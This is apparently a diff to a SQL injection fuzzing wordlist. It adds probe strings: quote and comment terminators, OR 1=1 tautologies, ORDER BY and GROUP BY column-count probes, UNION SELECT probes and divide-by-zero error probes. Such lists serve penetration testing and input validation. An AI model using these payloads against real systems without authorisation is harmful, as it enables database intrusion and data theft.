@@ -1,7 +1,10 @@
 '
 "
-` 
+`
+''
+""
 '--
+'-- -
 "-- 
 '#
 "#
@@ -9,9 +12,18 @@
 " OR "1"="1
 ' OR 1=1--
 " OR 1=1--
-') 
+' OR '1'='2
+')
 ")
 '))
+"))
 ' ORDER BY 1--
 ' ORDER BY 100--
+' ORDER BY 999--
 ' GROUP BY 1--
+' GROUP BY 100--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT NULL--
+' AND 1/0--
+' OR 1/0--
